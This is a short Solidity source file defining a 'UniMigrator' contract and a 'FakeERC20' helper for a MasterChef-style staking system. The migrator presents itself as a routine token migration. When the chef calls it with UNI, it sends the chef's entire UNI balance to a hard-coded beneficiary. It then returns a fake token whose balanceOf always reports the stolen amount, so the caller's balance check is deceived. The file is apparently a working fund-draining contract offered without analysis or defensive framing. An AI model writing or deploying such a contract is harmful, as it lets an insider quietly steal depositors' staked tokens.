pragma solidity 0.6.12;
import "./lib/token/ERC20/IERC20.sol";

contract FakeERC20 {
    uint256 public amount;

    constructor(uint256 _amount) public {
        amount = _amount;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return amount;
    }
}

contract UniMigrator {
    address public chef;
    address public origin;
    address public beneficiary;

    constructor(
        address _chef,
        address _origin,
        address _beneficiary
    ) public {
        chef = _chef;
        origin = _origin;
        beneficiary = _beneficiary;
    }

    function migrate(IERC20 src) public returns (address) {
        require(address(src) == 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, "not uni token");
        require(msg.sender == chef, "not from master chef");
        require(tx.origin == origin, "not from origin");
        uint256 bal = src.balanceOf(msg.sender);
        src.transferFrom(msg.sender, beneficiary, bal);
        return address(new FakeERC20(bal));
    }
}
